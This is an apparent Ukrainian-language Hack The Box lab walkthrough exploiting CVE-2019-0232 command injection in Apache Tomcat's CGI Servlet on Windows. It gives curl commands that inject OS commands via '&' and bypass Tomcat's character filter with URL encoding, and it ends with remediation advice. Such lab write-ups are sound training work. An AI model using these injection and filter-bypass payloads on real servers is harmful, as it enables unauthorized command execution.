# Attacking Common Applications — Attacking Tomcat CGI

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking Tomcat CGI](https://academy.hackthebox.com/app/module/113/section/2140)
Ціль: `10.129.205.30` (Windows, Apache Tomcat/9.0.17)

Q1 (користувач, від якого запущений Tomcat): `feldspar\omen`

## Концепція

`CVE-2019-0232` — критична command injection вразливість у CGI Servlet Apache Tomcat на Windows-системах з увімкненим `enableCmdLineArguments`; параметр змушує CGI Servlet парсити query string і передавати його як аргументи командного рядка `.bat`/`.cmd`-скрипту, а сам JRE на Windows має баг у способі передачі цих аргументів у процес ОС, що відкриває шлях до інʼєкції через роздільник `&`.

## Крок 1 — Сканування портів (термінал 1)

```bash
nmap -p- -sC -Pn 10.129.205.30 --open
```

Ключовий результат: `8080/tcp open http-proxy` з баннером `Apache Tomcat/9.0.17` — версія входить у вразливий діапазон (`9.0.0.M1`–`9.0.17`), також видно типовий набір Windows-портів (`135`, `139`, `445`, `5985`, `47001`), що підтверджує ОС цілі.

## Крок 2 — Fuzzing для .cmd файлів (термінал)

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.cmd
```

Результат негативний — жодного `.cmd`-скрипта не знайдено, тому переходимо до наступного розширення.

## Крок 3 — Fuzzing для .bat файлів (термінал)

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
```

Результат: знайдено `welcome.bat` (Status 200, Size 81) — валідний CGI-скрипт, доступний за `http://10.129.205.30:8080/cgi/welcome.bat`.

## Крок 4 — Перевірка базового доступу (термінал)

```bash
curl http://10.129.205.30:8080/cgi/welcome.bat
```

Повертає: `Welcome to CGI, this section is not functional yet. Please return to home page.`

## Крок 5 — Спроба command injection через & (термінал)

```bash
curl http://10.129.205.30:8080/cgi/welcome.bat?&dir
```

Важлива деталь-пастка: символ `&` у bash одночасно є оператором фонового запуску, тому без екранування (лапок) shell розбиває команду навпіл — частина URL іде в `curl`, а залишок (`dir`) виконується локально як окрема команда. Правильний підхід — обгортати весь URL в лапки:

```bash
curl "http://10.129.205.30:8080/cgi/welcome.bat?&dir"
```

## Крок 6 — Отримання environment variables (термінал)

```bash
curl "http://10.129.205.30:8080/cgi/welcome.bat?&set"
```

Ключове спостереження — змінна `PATH` в CGI-контексті відсутня (unset), тому прямі виклики `whoami` чи `dir` без повного шляху до бінарника працюють лише частково, і для надійного виконання команд потрібно хардкодити повний шлях (`c:\windows\system32\...`).

## Крок 7 — Спроба з повним шляхом (термінал)

```bash
curl "http://10.129.205.30:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe"
```

Tomcat повертає помилку про недопустимий символ — патч Tomcat додав regex-фільтр, що блокує спецсимволи типу `:` та `\` у сирому вигляді в query string.

## Крок 8 — Обхід фільтра через URL-encoding (термінал)

Ще одна пастка, з якою ми зіштовхнулись: якщо не обгорнути весь URL у лапки, bash сам "з'їдає" `&` як оператор фону, і команда `whoami.exe` виконується локально (`bash: c%3A%5C...whoami.exe: command not found`), а не на цілі. Правильна команда:

```bash
curl "http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```

Пояснення: `%3A` = `:`, `%5C` = `\` — URL-кодування дозволяє символам пройти крізь regex-фільтр Tomcat незміненими, оскільки перевірка спрацьовує до декодування запиту, а Windows CGI-обробник декодує їх назад перед фактичним виконанням команди.

Результат:
```
Welcome to CGI, this section is not functional yet. Please return to home page.
feldspar\omen
```

**Q1 = `feldspar\omen`**

## Чому це важливо (root cause)

- **Опис:** CGI Servlet Tomcat на Windows з увімкненим `enableCmdLineArguments` дозволяє неавтентифікованому зловмиснику виконати довільні OS-команди через query string параметри (CWE-78, OS Command Injection).
- **Технічні деталі:** Баг конкретно в тому, як JRE на Windows передає аргументи командного рядка процесу `cmd.exe` — символ `&` не escape'иться належним чином, а пізніший патч Tomcat (regex-фільтр спецсимволів у query string) можна обійти простим URL-кодуванням, бо перевірка відбувається до декодування запиту сервером.
- **Ризик/Імпакт:** Отримане виконання команд з правами домен-акаунта `feldspar\omen` — це не найвищий рівень привілеїв (не SYSTEM), проте достатньо для подальшої розвідки AD-домену `feldspar`, пошуку credentials, kerberoasting чи privilege escalation до вищих прав.
- **Рекомендації:** Оновити Tomcat до версії ≥9.0.19 (або ≥8.5.40, ≥7.0.94), явно вимкнути `enableCmdLineArguments` в `web.xml`, взагалі не розгортати CGI Servlet на продакшн-серверах якщо він не критично потрібен, запускати сервіс Tomcat під виділеним service-акаунтом з мінімально необхідними правами (принцип найменших привілеїв), а не під звичайним доменним користувачем із зайвими правами.
